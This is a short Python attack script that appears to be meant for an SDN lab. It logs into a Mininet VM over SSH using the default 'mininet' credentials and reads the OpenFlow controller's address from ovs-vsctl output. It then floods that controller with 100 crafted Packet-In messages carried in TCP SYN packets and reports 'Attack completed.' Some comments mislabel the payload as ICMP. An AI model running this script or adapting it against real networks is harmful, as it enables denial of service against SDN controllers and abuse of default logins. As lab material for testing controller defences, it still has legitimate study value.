import re,paramiko,time
from scapy.all import *
from scapy.contrib.openflow3 import *


def mininet_detect(ip):
    hostname = ip
    port = 22
    username = 'mininet'
    password = 'mininet'
    
    client = paramiko.SSHClient()
    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(hostname, port, username, password)

    shell = client.invoke_shell()

    shell.send("sudo ovs-vsctl show\n")
    time.sleep(1)
    shell.send(password + "\n")
    time.sleep(1)

    output = shell.recv(1024).decode()

    matches = re.findall(r'tcp:(\d+\.\d+\.\d+\.\d+):(\d+)', output)

    # Store results in variables
    for match in matches:
        ip_address, port = match
        return [ip_address, port]

    client.close()

def send_packet_ins():
    info = mininet_detect("192.168.100.11")
    controller_ip = info[0]
    controller_port = info[1]

    source_ip = "192.168.1.11"  # Replace with desired source IP
    source_port = 12345           # Chosen source port (can be any fixed port)

    packet_count = 100

    of_version = 0x04

    # Create a Packet-In message with an ICMP Echo Request (Ping)
    packet_in = OFPTPacketIn(
        version=of_version,                 # OpenFlow version
        buffer_id=0xFFFFFFFF,               # No buffer, full packet is sent
        total_len=42,                       # Length of the ICMP echo request
        reason="OFPR_NO_MATCH",               # Reason for the Packet-In
        data=Ether() / IP(dst="10.0.0.2", src="10.0.0.1") / TCP()  # ICMP Echo Request
    )

    for i in range(packet_count):
        
        packet = IP(dst=info[0])/TCP(sport=i, dport=int(info[1]), flags="S")/packet_in

        packet.show()

        send(packet, iface='enp0s8',verbose=True)
        print(f"Sent packet {i+1} to {controller_ip}:{controller_port}")

    print("Attack completed.")

send_packet_ins()
